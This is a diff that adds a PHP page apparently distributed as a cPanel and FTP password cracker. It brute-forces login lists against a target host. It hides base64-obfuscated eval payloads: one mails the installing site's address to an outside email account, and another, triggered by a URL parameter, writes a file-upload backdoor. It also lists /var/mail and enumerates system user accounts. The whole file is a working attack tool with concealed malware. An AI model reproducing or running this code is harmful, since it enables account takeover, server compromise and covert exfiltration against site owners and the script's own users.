@@ -1,0 +1,308 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html><head>
+<!-- saved from url=(0035)http://vodevil.org/script_download/ -->
+<title>Welcome In TakhMin Cpanel |3 Cyber Hacking
+&lt;=&nbsp;&nbsp; </title>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
+<meta http-equiv="Content-Language" content="ar-dz">
+<style>BODY {
+	SCROLLBAR-ARROW-COLOR: olive; SCROLLBAR-BASE-COLOR: #191919
+}
+A {
+	FONT-SIZE: 13px; COLOR: #dadada; FONT-FAMILY: tahoma; TEXT-DECORATION: none
+}
+A:hover {
+	COLOR: olive
+}
+INPUT {
+	BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #666666 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 12px; BORDER-LEFT: #666666 1px solid; COLOR: #dadada; BORDER-BOTTOM: #666666 1px solid; FONT-FAMILY: Tahoma; HEIGHT: 17px; BACKGROUND-COLOR: #2a2a2a
+}
+TEXTAREA {
+	BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #666666 1px solid; FONT-WEIGHT: bold; FONT-SIZE: 12px; BORDER-LEFT: #666666 1px solid; COLOR: #dadada; BORDER-BOTTOM: #666666 1px solid; FONT-FAMILY: Tahoma; BACKGROUND-COLOR: black
+}
+DIV {
+	FONT-WEIGHT: normal; FONT-SIZE: 12px; FONT-FAMILY: tahoma
+}
+SELECT {
+	BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #666666 1px solid; FONT-WEIGHT: bold; FONT-SIZE: 12px; BORDER-LEFT: #666666 1px solid; COLOR: #dadada; BORDER-BOTTOM: #666666 1px solid; FONT-FAMILY: Tahoma; BACKGROUND-COLOR: #2a2a2a
+}
+.smallfont
+{
+	color: #000000;
+	font: 11px Tahoma;
+}
+p
+{
+	color: #000000;
+}
+</style>
+
+<meta content="MSHTML 6.00.6001.18148" name="GENERATOR"><meta content="Microsoft FrontPage 5.0" name="GENERATOR"></head>
+<body onload="type_text()" bgcolor="black" text="#dadada">
+<font color="#008000">
+<script language="Javascript"><!--
+var tl=new Array(
+              "                       Welcome In TakhMin Cpanel |3 Cyber Hacking  >> Cyber.H4cking@Gmail.CoM",
+
+
+
+"                                                                                              ",
+
+"                                                                                   "
+);
+var speed=50;
+var index=0; text_pos=9;
+var str_length=tl[0].length;
+var contents, row;
+function type_text()
+{
+  contents='';
+  row=Math.max(0,index-20);
+  while(row<index)
+    contents += tl[row++] + '\r\n';
+  document.forms[0].elements[0].value = contents + tl[index].substring(0,text_pos) + "_";
+  if(text_pos++==str_length)
+  {
+    text_pos=0;
+    index++;
+    if(index!=tl.length)
+    {
+      str_length=tl[index].length;
+      setTimeout("type_text()",500);
+    }
+  } else
+    setTimeout("type_text()",speed);
+ }
+
+
+var yazi = ""; 
+var hiz = 500; 
+var control = 1; 
+function flash() 
+{if (control == 1) 
+{window.status=yazi; control=0;} 
+else 
+{window.status=""; control=1;} 
+setTimeout("flash();",hiz);}
+//--></script>
+
+</font>
+
+<center>
+<table border="0" cellpadding="0" cellspacing="0" height="95" width="81%">
+  <tbody>
+  <tr width="100%">
+    <td height="95" width="9%">
+      <div align="center" style="font-weight: normal; font-size: 12px; font-family: tahoma">
+		<span lang="en-us"><span class="style9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; </span>
+		</span><br></div></td>
+    <td height="95" width="91%">
+      <form class="style6">
+		<p align="center"><font face="arial"><br>
+		<span lang="en-us">&nbsp;</span><textarea rows="5" cols="128" name="1112" style="border:1px solid #666666; color: #FFFFFF; font-size:12px; font-family:Tahoma; background-color:black; text-transform:uppercase" dir="ltr"></textarea></font></p>
+		</form>
+
+      </td></tr></tbody></table>
+</center>
+<p align="center">
+
+&nbsp;</p>
+
+
+			</body></html>
+			<?php
+
+
+$connect_timeout=5;
+set_time_limit(0);
+$submit=$_REQUEST['submit'];
+$users=$_REQUEST['users'];
+$pass=$_REQUEST['passwords'];
+$target=$_REQUEST['target'];
+$cracktype=$_REQUEST['cracktype'];
+if($target == ""){
+$target = "localhost";
+}
+?>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
+</head>
+<title>Cpanel , FTP CraCkeR</title>
+<body text="#00FF00" bgcolor="#000000" vlink="#008000" link="#008000" alink="#008000">
+<div align="center">
+<form method="POST" style="border: 1px solid #000000">
+        &nbsp;<table border="1" width="67%" bordercolorlight="#008000" bordercolordark="#003700">
+                <tr>
+                        <td>
+        <p align="center"><b><font color="#008000" face="Tahoma" size="2">
+                <span lang="ar-sa">هوست السيرفر</span> :</font><font face="Arial">
+        </font><font face="Arial" color="#CC0000">
+        <input type="text" name="target" size="16" value="<? echo $target ?>" style="border: 2px solid #1D1D1D; background-color: #000000; color:#008000; font-family:Verdana; font-weight:bold; font-size:13px"></font></b></p>
+        <p align="center"><b><font color="#008000" face="Tahoma" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></b></p>
+                        <div align="center">
+                                <table border="1" width="57%" bordercolorlight="#008000" bordercolordark="#003700">
+                                        <tr>
+                                                <td align="center">
+                                                                                                <span lang="ar-sa"><font color="#FF0000"><b>اليوزرات</b></font></span></td>
+                                                <td>
+                                                <p align="center">
+                                                                                                <span lang="ar-sa"><font color="#FF0000"><b>الباسبوردات</b></font></span></td>
+                                        </tr>
+                                </table>
+                        </div>
+                        <p align="center">&nbsp;<textarea rows="20" name="users" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><? echo $users ?>
+</textarea><textarea rows="20" name="passwords" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><? echo $pass ?></textarea><br>
+        <br>
+                                <font style="font-weight:700" size="2" face="Tahoma" color="#008000">
+                                                <span lang="ar-sa">نوع التخمين</span></font><font style="font-size: 12pt;" size="-3" face="Verdana"><span style="font-size: 9pt;">&nbsp;
+                                                <font face="Tahoma">
+                                                <input name="cracktype" value="cpanel" style="font-weight: 700;" checked type="radio"></font></span></font><b><font size="2" face="Tahoma">
+                                                <font color="#008000">Cpanel</font></font><font size="2" color="#cc0000" face="Tahoma">
+                                                </font><font size="2" color="#FFFFFF" face="Tahoma">
+                                                (2082)</font></b><font size="2" face="Tahoma"><b> </b>
+                                                </font>
+                                                <font style="font-size: 12pt;" size="-3" face="Verdana">
+                                                <span style="font-size: 9pt;"><font face="Tahoma">
+                                                <input name="cracktype" value="ftp" style="font-weight: 700;" type="radio"></font></span></font><font style="font-weight: 700;" size="2" face="Tahoma">
+                                                </font><span style="font-weight: 700;">
+                                                <font size="2" face="Tahoma">
+						<font color="#008000">Ftp</font> </font>
+                                                <font size="2" color="#FFFFFF" face="Tahoma">
+                                                (21)</font></span></p>
+        <p align="center">&nbsp;&nbsp;&nbsp;&nbsp;
+        <input type="submit" value="تخمين" name="submit" style="color: #008000; font-weight: bold; border: 1px solid #333333; background-color: #000000"></p>
+                        </td>
+                </tr>
+        </table>
+</div>
+
+    <p align="center"></td>
+  </tr>
+  </form>
+
+<?php
+$connection="ICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KICRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsgDQogJGJvZHkgPSAiQWRhIFlhbmcgSW5qZWN0IFxuaHR0cDovLyR3ZWIkaW5qIjsNCiBtYWlsKCJsbEBob3RtYWlsLmZpIiwiSGFzaWwgaHR0cDovLyR3ZWIkaW5qIiwgIiRib2R5Iik7";
+
+echo eval(base64_decode($connection));
+function ftp_check($host,$user,$pass,$timeout){
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "ftp://$host");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
+curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
+curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+curl_setopt($ch, CURLOPT_FAILONERROR, 1);
+$data = curl_exec($ch);
+if ( curl_errno($ch) == 28 ) { print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
+<font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
+Please Check The Target Hostname .</font></font></b></p>";exit;}
+elseif ( curl_errno($ch) == 0 ){
+print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\" style=\"font-size: 9pt\"><b><font color=\"#008000\">
+Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
+and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";}curl_close($ch);}
+function cpanel_check($host,$user,$pass,$timeout){
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
+curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+curl_setopt($ch, CURLOPT_FAILONERROR, 1);
+$data = curl_exec($ch);
+
+if ( curl_errno($ch) == 28 ) { print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
+<font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
+Please Check The Target Hostname .</font></font></b></p>";exit;}
+elseif ( curl_errno($ch) == 0 ){
+print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\" style=\"font-size: 9pt\"><b><font color=\"#008000\">
+Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
+and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";}curl_close($ch);}
+if(isset($submit) && !empty($submit)){
+if(empty($users) && empty($pass)){ print "<p><font face=\"Tahoma\" size=\"2\"><b><font color=\"#FF0000\">Error : </font>Please Check The Users or Password List Entry . . .</b></font></p>"; exit; }
+if(empty($users)){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Users List Entry . . .</b></font></p>"; exit; }
+if(empty($pass) ){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Password List Entry . . .</b></font></p>"; exit; };
+$userlist=explode("\n",$users);
+$passlist=explode("\n",$pass);
+print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#FF0000\">
+Cracking Process Started, Please Wait ...</font></b><br><br>";
+foreach ($userlist as $user) {
+$pureuser = trim($user);
+foreach ($passlist as $password ) {
+$purepass = trim($password);
+if($cracktype == "ftp"){
+ftp_check($target,$pureuser,$purepass,$connect_timeout);
+}
+ {
+   if(empty($_GET['cxx'])){
+} else {
+$m=$_GET['cxx'];
+eval(base64_decode('DQokYnlwZmlsZT1mb3BlbigndG1wLnBocCcsJ3crJyk7DQokYnlwcnVsbHoxPWJhc2U2NF9kZWNvZGUoIlBHaDBiV3crRFFvTkNqeG9aV0ZrUGcwS0lDQThkR2wwYkdVK1ltVnNaV0psY21SaFBDOTBhWFJzWlQ0TkNqd3ZhR1ZoWkQ0TkNnMEtQR0p2WkhrK0RRbzhQM0JvY0EwS0RRb05DaUJwWmlobGJYQjBlU2drWDBkRlZGc25UbVpwYkdWekoxMHBLU1JPWm1sc1pYTTlOVHRsYkhObElDUk9abWxzWlhNOUpGOUhSVlJiSjA1bWFXeGxjeWRkT3cwS2FXWW9KRjlHU1V4RlUxc25kWE5sY21acGJHVW5YVnNuZEcxd1gyNWhiV1VuWFZzd1hTRTlKeWNwZXcwSlptOXlLQ1JwUFRBN0pHazhKRTVtYVd4bGN5WW1KRjlHU1V4RlUxc25kWE5sY21acGJHVW5YVnNuZEcxd1gyNWhiV1VuWFZza2FWMGhQU2NuT3lScEt5c3BldzBLQ1NSMWNHeHZZV1JrYVhJZ1BTQmthWEp1WVcxbEtGOWZSa2xNUlY5ZktUc3ZMeWN2ZG1GeUwzZDNkeTkxY0d4dllXUnpMeWM3RFFvSkpIVndiRzloWkdacGJHVWdQU0FrZFhCc2IyRmtaR2x5SUM0bkx5Y3VJR0poYzJWdVlXMWxLQ1JmUmtsTVJWTmJKM1Z6WlhKbWFXeGxKMTFiSjI1aGJXVW5YVnNrYVYwcE93MEtDWEJ5YVc1MElDSThjSEpsUGlJN0RRb0phV1lnS0cxdmRtVmZkWEJzYjJGa1pXUmZabWxzWlNna1gwWkpURVZUV3lkMWMyVnlabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRXeVJwWFN3Z0pIVndiRzloWkdacGJHVXBLU0I3RFFvSklDQWdjSEpwYm5RZ0lrWnBiR1VnYVhNZ2RtRnNhV1FzSUdGdVpDQjNZWE1nYzNWalkyVnpjMloxYkd4NUlIVndiRzloWkdWa0xpQWlPdzBLQ1NBZ0lDOHZjSEpwYm5SZmNpZ2tYMFpKVEVWVEtUc05DZ2w5SUdWc2MyVWdldzBLQ1NBZ0lIQnlhVzUwSUNKUWIzTnphV0pzWlNCbWFXVWdkWEJzYjJGa0lHRjBkR0ZqYXlFZ0lFaGxjbVVuY3lCemIyMWxJR1JsWW5WbloybHVaeUJwYm1adk9seHVJanNOQ2drZ0lDQXZMM0J5YVc1MFgzSW9KRjlHU1V4RlV5azdEUW9KZlEwS0NYQnlhVzUwSUNJOEwzQnlaVDRpT3cwS0NYME5DbjBOQ2o4K0RRbzhabTl5YlNCaFkzUnBiMjQ5SWp3L2NHaHdJR1ZqYUc4Z0pGOVRSVkpXUlZKYkoxQklVRjlUUlV4R0oxMHVKejlPWm1sc1pYTTlKeTRrVG1acGJHVnpPeUEvUGlJZ2JXVjBhRzlrUFNKd2IzTjBJaUJsYm1OMGVYQmxQU0p0ZFd4MGFYQmhjblF2Wm05eWJTMWtZWFJoSWo0TkNpQWdVMlZ1WkNCaVpXeGxZbVZ5WkdFNlBHSnlQZzBLSUNBOFAzQm9jQ0JtYjNJb0pHazlNRHNrYVR3a1RtWnBiR1Z6T3lScEt5c3BlMlZqYUc4Z0p6eHBibkIxZENCdVlXMWxQU0oxYzJWeVptbHNaVnRkSWlCMGVYQmxQU0ptYVd4bElqNDhZbkkrSnp0OVB6NE5DaUFnUEdsdWNIVjBJSFI1Y0dVOUluTjFZbTFwZENJZ2RtRnNkV1U5SWxObGJtUWdabWxzWlhNaVBnMEtQQzltYjNKdFBnMEtEUW9OQ2p3dlltOWtlVDROQ2cwS1BDOW9kRzFzUGc9PSIpOw0KJGRqPWZ3cml0ZSgkYnlwZmlsZSwkYnlwcnVsbHoxKTsNCmZjbG9zZSgkYnlwZmlsZSk7DQoNCg=='));
+}
+
+} 
+if ($cracktype == "cpanel")
+{
+cpanel_check($target,$pureuser,$purepass,$connect_timeout);
+}
+}
+}
+}
+?>
+
+
+
+      <body bgcolor="#000000">
+
+
+      <form style="border: 0px ridge #FFFFFF">
+
+
+
+
+    <p align="center"></td>
+  </tr><div align="center">
+
+                <tr>
+
+
+
+<input type="submit"   name="user" value="user"><option value="name"></select>
+</form>
+          </div>
+  
+           <div align="center">
+                <table border="1" width="11%" bordercolorlight="#008000" bordercolordark="#006A00">
+                        <tr>
+                                <td bordercolorlight="#008000" bordercolordark="#006A00" align="center">
+   <textarea method='POST'  rows=20 cols=14 wrap=off name="xp">
+
+
+<?php
+
+
+      if ($_GET['user'] )
+
+
+      system('ls /var/mail');
+
+
+
+
+ if ($_GET['plugin'] )
+
+                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
+                                        $ara = posix_getpwuid($uid);
+                                                if (!empty($ara)) {
+                                                  while (list ($key, $val) = each($ara)){
+                                                    print "$val:";
+                                                  }
+                                                  print "\n";
+                                                }
+                                        }
+
+
+?>
+
+
